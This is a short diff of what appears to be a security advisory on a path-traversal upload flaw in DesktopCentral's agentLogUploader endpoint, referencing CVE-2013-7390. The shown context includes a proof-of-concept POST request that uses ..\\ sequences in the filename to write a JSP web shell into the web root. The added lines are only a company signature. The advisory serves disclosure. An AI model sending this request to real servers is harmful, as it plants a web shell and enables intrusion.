@@ -39,3 +39,8 @@ Notes: This was previously discovered as CVE-2013-7390 / OSVDB-10008 by Thomas H
 
 POST /agentLogUploader?computerName=whatever1&domainName=whatever2&customerId=1337&filename=..\\..\\..\\..\\webapps\\DesktopCentral\\shell.jsp 
 <... your favourite jsp shell here ...>
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
